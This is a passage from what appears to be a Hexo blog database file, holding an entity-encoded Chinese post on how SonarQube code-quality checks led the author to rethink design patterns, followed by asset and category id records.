id=\"more\"></a><br>&#x53EF;&#x662F;&#x8FD9;&#x4E9B;&#x5E74;&#x8FC7;&#x53BB;&#xFF0C;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7ED9;&#x6211;&#x7684;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x9065;&#x4E0D;&#x53EF;&#x53CA;&#xFF0C;&#x4EFF;&#x4F5B;&#x5B83;&#x53EA;&#x5B58;&#x5728;&#x4E8E;&#x9762;&#x8BD5;&#x9898;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x5947;&#x602A;&#x7684;&#x662F;&#x5927;&#x5BB6;&#x95F2;&#x65F6;&#x8C08;&#x8BBA;&#x6280;&#x672F;&#x4E5F;&#x5F88;&#x5C11;&#x6D89;&#x53CA;&#xFF0C;why? &#x9996;&#x5148;&#x81EA;&#x6211;&#x53CD;&#x601D;&#xFF0C;&#x90A3;&#x662F;&#x81EA;&#x8EAB;&#x6C34;&#x5E73;&#x4E0D;&#x884C;&#xFF0C;get&#x4E0D;&#x5230;&#x6838;&#x5FC3;&#xFF0C;&#x4F46;&#x6211;&#x76F8;&#x4FE1;&#x8FD9;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x539F;&#x56E0;&#x3002;</p>\n<p>&#x6211;&#x8BA4;&#x4E3A;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x51FA;&#x73B0;&#x662F;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5199;&#x597D;&#x4EE3;&#x7801;&#xFF0C;&#x5B83;&#x53EA;&#x662F;&#x624B;&#x6BB5;&#xFF0C;&#x4E0D;&#x662F;&#x76EE;&#x7684;&#x3002;&#x5948;&#x4F55;&#x8FD9;&#x7CFB;&#x5217;&#x624B;&#x6BB5;&#x592A;&#x9AD8;&#x660E;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x662F;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x7684;&#x83DC;&#x3002;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x6CA1;&#x638C;&#x63E1;&#xFF0C;&#x90A3;&#x5927;&#x795E;&#x7EA7;&#x522B;&#x7684;&#x5E73;&#x5E38;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x600E;&#x4E48;&#x8C08;&#x8BBA;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5462;&#xFF1F;&#x6211;&#x60F3;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x5C42;&#x7EA7;&#x7684;&#x4EBA;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x91CC;&#x9762;&#x7684;&#x903C;&#x683C;&#x540D;&#x8BCD;&#x8C08;&#x8BBA;&#xFF0C;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x6C9F;&#x901A;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5E73;&#x5E38;&#x662F;&#x8FD9;&#x4E48;&#x8BA8;&#x8BBA;&#x7684;&#xFF1A;</p>\n<ul>\n<li>&#x8FD9;&#x4E2A;&#x7C7B;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5BF9;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x8FB9;&#x5305;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x5BF9;&#x7684;&#x3002;</li>\n<li>&#x55EF;&#xFF0C;&#x4F60;&#x8FD9;&#x4E2A;&#x7C7B;&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x4ED6;&#x7684;Interface&#x505A;&#x7684;&#x4E00;&#x4E2A;Adapter&#xFF0C;&#x662F;&#x7684;&#x3002;</li>\n<li>&#x4F60;&#x8FD9;&#x4E2A;&#x53EA;&#x521B;&#x5EFA;&#x4E00;&#x6B21;&#xFF0C;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3002;&#x54E6;&#xFF0C;&#x5BF9;&#xFF0C;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x8FD9;&#x6837;&#x66F4;&#x597D;&#xFF0C;balabala&#x2026;</li>\n</ul>\n<p>&#x6240;&#x4EE5;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x4E0B;&#x53EA;&#x662F;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x6761;&#x5FEB;&#x901F;&#x63D0;&#x5347;&#x903C;&#x683C;&#x7684;&#x9014;&#x5F84;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x4E0A;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x5C31;&#x7B97;&#x628A;&#x6240;&#x6709;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x80CC;&#x4E0B;&#x6765;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x4F1A;&#x7528; 0.0</p>\n<h4 id=\"SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x624D;&#x80FD;&#x4F18;&#x96C5;&#x7684;&#x638C;&#x63E1;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5450;&#xFF0C;&#x60F3;&#x6765;&#x60F3;&#x53BB;&#xFF0C;&#x6211;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x4E86;&#x89E3;&#x5B83;&#xFF0C;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x7136;&#x540E;&#x5FFD;&#x7565;&#x5B83;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x52AA;&#x529B;&#x81EA;&#x5DF1;&#x53BB;&#x63D0;&#x9AD8;&#x4EE3;&#x7801;&#x7684;&#x9605;&#x8BFB;&#x6027;&#x3002;&#x5F53;&#x4F60;&#x60F3;&#x5C3D;&#x4E00;&#x5207;&#x529E;&#x6CD5;&#x53BB;&#x63A7;&#x5236;&#x4F60;&#x7684;&#x4EE3;&#x7801;&#x91CF;&#x3001;&#x51CF;&#x5C11;&#x5D4C;&#x5957;&#x4E0E;&#x5FAA;&#x73AF;&#x3001;&#x51CF;&#x5C11;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x65F6;&#xFF0C;&#x6211;&#x60F3;&#x65F6;&#x95F4;&#x957F;&#x4E86;&#xFF0C;&#x65E0;&#x5E08;&#x81EA;&#x901A;&#xFF0C;&#x81EA;&#x6709;&#x4E00;&#x756A;&#x98CE;&#x666F;&#x3002;</p>\n<p><img src=\"/2016/06/05/&#x4ECE;SonarQube&#x8C08;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;/1.png\" alt=\"&#x91CD;&#x6784;&#x539F;&#x5219;\"></p>\n","excerpt":"<h4 id=\"SonarQube\"><a href=\"#SonarQube\" class=\"headerlink\" title=\"SonarQube\"></a>SonarQube</h4><p>SonarQube&#x662F;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x7684;&#xFF0C;&#x4F46;&#x7C7B;&#x4F3C;&#x5DE5;&#x5177;&#x7684;&#x63A8;&#x5E7F;&#x5E38;&#x5E38;&#x9047;&#x5230;&#x963B;&#x788D;&#x3002;</p>\n<p>&#x6210;&#x578B;&#x9879;&#x76EE;&#x6216;&#x50F5;&#x5C38;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#xFF0C;&#x9879;&#x76EE;&#x4F18;&#x5316;&#x9700;&#x8981;&#x6295;&#x5165;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x548C;&#x65F6;&#x95F4;&#x6210;&#x672C;&#x592A;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x6539;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x5F15;&#x5165;&#x65B0;&#x7684;bug&#x3002;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x4F1A;&#x60F3;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x7ACB;&#x9879;&#x521D;&#x671F;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x5427;&#xFF1F;&#x5948;&#x4F55;&#x7406;&#x7531;&#x8FD9;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x8981;&#x60F3;&#x627E;&#xFF0C;&#x603B;&#x662F;&#x6709;&#x7684;&#x3002;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x90FD;&#x559C;&#x6B22;&#x5F85;&#x5728;&#x8212;&#x9002;&#x533A;&#xFF0C;&#x4E0D;&#x559C;&#x6B22;&#x6298;&#x817E;&#x3002;&#x8BD5;&#x60F3;&#x521A;&#x63D0;&#x4EA4;&#x5B8C;&#x4EE3;&#x7801;&#x6CA1;&#x591A;&#x4E45;&#xFF0C;&#x90AE;&#x4EF6;&#x5C31;&#x63D0;&#x9192;&#x4F60;&#x9700;&#x8981;&#x4F18;&#x5316;&#xFF0C;&#x6253;&#x5F00;&#x4E00;&#x770B;&#xFF0C;&#x539F;&#x6765;&#x53C8;&#x662F;for&#x5FAA;&#x73AF;&#x592A;&#x591A;&#x3001;&#x5D4C;&#x5957;&#x592A;&#x591A;&#x3001;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x884C;&#x6570;&#x592A;&#x591A;&#x3002;why&#xFF1F;&#x6211;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#x5417;&#xFF1F;&#x65F6;&#x95F4;&#x8FD9;&#x4E48;&#x7D27;&#x8FEB;&#xFF0C;&#x600E;&#x4E48;&#x6709;&#x65F6;&#x95F4;&#x4FEE;&#x6539;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x8FDE;&#x8FD9;&#x4E9B;&#x5C0F;&#x95EE;&#x9898;&#x90FD;&#x6293;&#x4F4F;&#x4E0D;&#x653E;&#xFF1F;&#x5475;&#x5475;&#xFF0C;&#x4EE5;&#x540E;&#x6709;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x6539;&#x3002;</p>\n<p>&#x6211;&#x8D77;&#x521D;&#x4E5F;&#x8FD9;&#x4E48;&#x60F3;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x517B;&#x6210;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x907F;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x6240;&#x62B5;&#x89E6;&#x3002;&#x4E0D;&#x8FC7;&#x597D;&#x5728;&#x4E0A;&#x5934;&#x89C4;&#x5B9A;&#x76F8;&#x5173;&#x7C7B;&#x578B;bug&#x5FC5;&#x987B;&#x6E05;&#x96F6;&#xFF0C;&#x575A;&#x6301;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x957F;&#xFF0C;&#x6536;&#x83B7;&#x8FD8;&#x662F;&#x86EE;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4F53;&#x73B0;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6613;&#x8BFB;&#x6027;&#x52A0;&#x5F3A;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7A81;&#x7136;&#x5C31;&#x60F3;&#x8D77;&#x4E86;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x3002;</p>\n<h4 id=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x81EA;&#x5927;&#x4E8C;&#x63A5;&#x89E6;Java&#x4EE5;&#x6765;&#xFF0C;&#x5C31;&#x77E5;&#x9053;IT&#x754C;&#x6709;&#x4E00;&#x79CD;&#x65E0;&#x4E0A;&#x529F;&#x6CD5;&#x53EB;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x7740;&#x54EA;&#x5929;&#x80FD;&#x878D;&#x4F1A;&#x8D2F;&#x901A;&#xFF0C;&#x6325;&#x624B;&#x95F4;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x7247;&#x9526;&#x7EE3;&#x4EE3;&#x7801;&#x3002;<br></p>","more":"<br>&#x53EF;&#x662F;&#x8FD9;&#x4E9B;&#x5E74;&#x8FC7;&#x53BB;&#xFF0C;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7ED9;&#x6211;&#x7684;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x9065;&#x4E0D;&#x53EF;&#x53CA;&#xFF0C;&#x4EFF;&#x4F5B;&#x5B83;&#x53EA;&#x5B58;&#x5728;&#x4E8E;&#x9762;&#x8BD5;&#x9898;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x5947;&#x602A;&#x7684;&#x662F;&#x5927;&#x5BB6;&#x95F2;&#x65F6;&#x8C08;&#x8BBA;&#x6280;&#x672F;&#x4E5F;&#x5F88;&#x5C11;&#x6D89;&#x53CA;&#xFF0C;why? &#x9996;&#x5148;&#x81EA;&#x6211;&#x53CD;&#x601D;&#xFF0C;&#x90A3;&#x662F;&#x81EA;&#x8EAB;&#x6C34;&#x5E73;&#x4E0D;&#x884C;&#xFF0C;get&#x4E0D;&#x5230;&#x6838;&#x5FC3;&#xFF0C;&#x4F46;&#x6211;&#x76F8;&#x4FE1;&#x8FD9;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x539F;&#x56E0;&#x3002;<p></p>\n<p>&#x6211;&#x8BA4;&#x4E3A;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x51FA;&#x73B0;&#x662F;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5199;&#x597D;&#x4EE3;&#x7801;&#xFF0C;&#x5B83;&#x53EA;&#x662F;&#x624B;&#x6BB5;&#xFF0C;&#x4E0D;&#x662F;&#x76EE;&#x7684;&#x3002;&#x5948;&#x4F55;&#x8FD9;&#x7CFB;&#x5217;&#x624B;&#x6BB5;&#x592A;&#x9AD8;&#x660E;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x662F;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x7684;&#x83DC;&#x3002;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x6CA1;&#x638C;&#x63E1;&#xFF0C;&#x90A3;&#x5927;&#x795E;&#x7EA7;&#x522B;&#x7684;&#x5E73;&#x5E38;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x600E;&#x4E48;&#x8C08;&#x8BBA;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5462;&#xFF1F;&#x6211;&#x60F3;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x5C42;&#x7EA7;&#x7684;&#x4EBA;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x91CC;&#x9762;&#x7684;&#x903C;&#x683C;&#x540D;&#x8BCD;&#x8C08;&#x8BBA;&#xFF0C;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x6C9F;&#x901A;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5E73;&#x5E38;&#x662F;&#x8FD9;&#x4E48;&#x8BA8;&#x8BBA;&#x7684;&#xFF1A;</p>\n<ul>\n<li>&#x8FD9;&#x4E2A;&#x7C7B;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5BF9;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x8FB9;&#x5305;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x5BF9;&#x7684;&#x3002;</li>\n<li>&#x55EF;&#xFF0C;&#x4F60;&#x8FD9;&#x4E2A;&#x7C7B;&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x4ED6;&#x7684;Interface&#x505A;&#x7684;&#x4E00;&#x4E2A;Adapter&#xFF0C;&#x662F;&#x7684;&#x3002;</li>\n<li>&#x4F60;&#x8FD9;&#x4E2A;&#x53EA;&#x521B;&#x5EFA;&#x4E00;&#x6B21;&#xFF0C;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3002;&#x54E6;&#xFF0C;&#x5BF9;&#xFF0C;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x8FD9;&#x6837;&#x66F4;&#x597D;&#xFF0C;balabala&#x2026;</li>\n</ul>\n<p>&#x6240;&#x4EE5;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x4E0B;&#x53EA;&#x662F;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x6761;&#x5FEB;&#x901F;&#x63D0;&#x5347;&#x903C;&#x683C;&#x7684;&#x9014;&#x5F84;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x4E0A;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x5C31;&#x7B97;&#x628A;&#x6240;&#x6709;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x80CC;&#x4E0B;&#x6765;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x4F1A;&#x7528; 0.0</p>\n<h4 id=\"SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x624D;&#x80FD;&#x4F18;&#x96C5;&#x7684;&#x638C;&#x63E1;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5450;&#xFF0C;&#x60F3;&#x6765;&#x60F3;&#x53BB;&#xFF0C;&#x6211;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x4E86;&#x89E3;&#x5B83;&#xFF0C;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x7136;&#x540E;&#x5FFD;&#x7565;&#x5B83;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x52AA;&#x529B;&#x81EA;&#x5DF1;&#x53BB;&#x63D0;&#x9AD8;&#x4EE3;&#x7801;&#x7684;&#x9605;&#x8BFB;&#x6027;&#x3002;&#x5F53;&#x4F60;&#x60F3;&#x5C3D;&#x4E00;&#x5207;&#x529E;&#x6CD5;&#x53BB;&#x63A7;&#x5236;&#x4F60;&#x7684;&#x4EE3;&#x7801;&#x91CF;&#x3001;&#x51CF;&#x5C11;&#x5D4C;&#x5957;&#x4E0E;&#x5FAA;&#x73AF;&#x3001;&#x51CF;&#x5C11;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x65F6;&#xFF0C;&#x6211;&#x60F3;&#x65F6;&#x95F4;&#x957F;&#x4E86;&#xFF0C;&#x65E0;&#x5E08;&#x81EA;&#x901A;&#xFF0C;&#x81EA;&#x6709;&#x4E00;&#x756A;&#x98CE;&#x666F;&#x3002;</p>\n<p><img src=\"/2016/06/05/&#x4ECE;SonarQube&#x8C08;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;/1.png\" alt=\"&#x91CD;&#x6784;&#x539F;&#x5219;\"></p>"}],"PostAsset":[{"_id":"source/_posts/微信公众号开发/1.png","slug":"1.png","post":"ciwbrulel004rgwtmeoq65a8k","modified":0,"renderable":0},{"_id":"source/_posts/微信公众号开发/2.png","slug":"2.png","post":"ciwbrulel004rgwtmeoq65a8k","modified":0,"renderable":0},{"_id":"source/_posts/微信公众号开发/3.png","slug":"3.png","post":"ciwbrulel004rgwtmeoq65a8k","modified":0,"renderable":0},{"_id":"source/_posts/微信公众号开发/4.png","slug":"4.png","post":"ciwbrulel004rgwtmeoq65a8k","modified":0,"renderable":0}],"PostCategory":[{"post_id":"ciwbrulai0009gwtm78gi3so4","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulap000fgwtm43nrqhg3"},{"post_id":"ciwbrul9w0001gwtm4148x45m","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulas000jgwtmv9gdzbw8"},{"post_id":"ciwbrulao000egwtm9pfhc4qo","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulau000mgwtm4iv8kqsv"},{"post_id":"ciwbrula40003gwtmxl0e201x","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulay000rgwtmotsl8a40"},{"post_id":"ciwbrulaq000ggwtmkbjq7otk","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulb1000tgwtmk8ibt2cf"},{"post_id":"ciwbrulat000lgwtm0fz114qc","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulb4000wgwtm7jxuxkyp"},{"post_id":"ciwbrulaa0007gwtmm3roawma","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulb6000ygwtmx65ypson"},{"post_id":"ciwbrulay000sgwtmlhiond2b","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulb70010gwtmjy2w4wm1"},{"post_id":"ciwbrulal000bgwtmc252k15c","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbrulba0015gwtmskckokrl"},{"post_id":"ciwbrulb2000ugwtm4ubhlkip","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulbc0018gwtm354cs8cl"},{"post_id":"ciwbrulb4000xgwtm9vjku6j9","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulbe001cgwtmfw48wd6f"},{"post_id":"ciwbrulb80012gwtmdb3yccep","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulbh001fgwtmh0p7vuxb"},{"post_id":"ciwbrulbd0019gwtmmo59zi59","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulbj001igwtmmgsl211c"},{"post_id":"ciwbrulb6000zgwtmp38ff9n6","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulbo001lgwtmo7n4gm69"},{"post_id":"ciwbrulbf001dgwtml0daa6pl","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulbr001pgwtmx368ac5w"},{"post_id":"ciwbrulbh001ggwtm6p7nlgsm","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulbt001sgwtmazuiloja"},{"post_id":"ciwbrulbb0016gwtmci33yz9q","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulbu001ugwtm9lwzhevh"},{"post_id":"ciwbrulbj001jgwtmts5d66ve","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulbx001ygwtmiran7avx"},{"post_id":"ciwbrulbo001mgwtm0qq47k2c","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulby0020gwtm8t8cmwfd"},{"post_id":"ciwbrulbr001qgwtmdxksm6kc","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulc00023gwtmrrqyf30f"},{"post_id":"ciwbrulbv001wgwtmdpwjhxsf","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulc20026gwtmrt159qa9"},{"post_id":"ciwbrulbx001zgwtm5nohdz3n","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulc8002agwtmrs6javqq"},{"post_id":"ciwbrulbz0021gwtm4awzx5sp","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulcc002dgwtm9208x4jp"},{"post_id":"ciwbrulbt001tgwtmbb06as0l","category_id":"ciwbrulbw001xgwtmpk32r2ce","_id":"ciwbrulcf002ggwtmqc4yvdry"},{"post_id":"ciwbrulc10025gwtmcjqghqt6","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulch002igwtmecakdxl6"},{"post_id":"ciwbrulc50028gwtmjf51orgm","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulci002kgwtmo949ym6o"},{"post_id":"ciwbrulc9002bgwtmgtagzgr6","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulck002ogwtmfwtt8j90"},{"post_id":"ciwbrulcd002egwtmivimugdl","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulcn002rgwtm8a0newkc"},{"post_id":"ciwbrulcf002hgwtmf3ox0ma9","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulcp002vgwtme7lbmiqe"},{"post_id":"ciwbrulch002jgwtm0kp2w0bp","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbrulcs002ygwtmnb7v75wu"},{"post_id":"ciwbrulcj002mgwtmx0me9x39","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulcv0031gwtmrf3bmtkb"},{"post_id":"ciwbrulck002pgwtmg2ykrv21","category_id":"ciwbrula90006gwtm4ob9s6um","_id":"ciwbrulcx0034gwtm5f55yn2r"},{"post_id":"ciwbrulcn002sgwtm49trk5o4","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbruld00038gwtmpk6lz8q6"},{"post_id":"ciwbrulcq002wgwtmudj9at01","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbruld2003bgwtm5avfrk61"},{"post_id":"ciwbrulcs002zgwtmbirk74rw","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbruld4003dgwtmvkbfhiuc"},{"post_id":"ciwbrulcw0032gwtmx3unfhm1","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbruld6003hgwtmusu2btpt"},{"post_id":"ciwbrulcy0035gwtmt1e06oot","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbruld8003jgwtmsozyxs61"},{"post_id":"ciwbruld10039gwtm6js8hhlr","category_id":"ciwbrulba0014gwtmn9myip3o","_id":"ciwbrulda003mgwtmwq29lrrp"},{"post_id":"ciwbruld3003cgwtmjuun421g","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbruldd003pgwtmh6fctdfh"},{"post_id":"ciwbruld4003fgwtmuo2vtla9","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbruldi003sgwtm59jb2d3t"},{"post_id":"ciwbruld6003igwtmlovemqag","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbruldl003ugwtmsdr8rvsc"},{"post_id":"ciwbruld9003kgwtmd8hepbv0","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbruldm003xgwtmnnl09087"},{"post_id":"ciwbruldc003ogwtm8i8cl5zr","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbruldp0040gwtmbe9vdpee"},{"post_id":"ciwbrulde003qgwtmoiahvos9","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbrulds0045gwtmrghbxjcd"},{"post_id":"ciwbruldi003tgwtmnkky8zpw","category_id":"ciwbrular000igwtmsp5pnzal","_id":"ciwbruldu0048gwtmrptekw9o"},{"post_id":"ciwbruldl003vgwtmk319x8ol","category_id":"ciwbrulbw001xgwtmpk32r2ce","_id":"ciwbrule8004cgwtmxmmu54sd"},{"post_id":"ciwbruldp0041gwtmzhy1py2v","category_id":"ciwbrulax000qgwtmuxo2s4j9","_id":"ciwbruleb004fgwtmrelw4ig2"},{"post_id":"ciwbrulds0046gwtmw3lrj9qq","category_id":"ciwbrulbw001xgwtmpk32r2ce","_id":"ciwbruleg004jgwtmsxfjo38p"},{"post_id":"ciwbruldv0049gwtmiaeombj8","category_id":"ciwbrulam000cgwtmwh71x2n5","_id":"ciwbrulei004mgwtm6aeob1ol"},{"post_id":"ciwbruldn003yg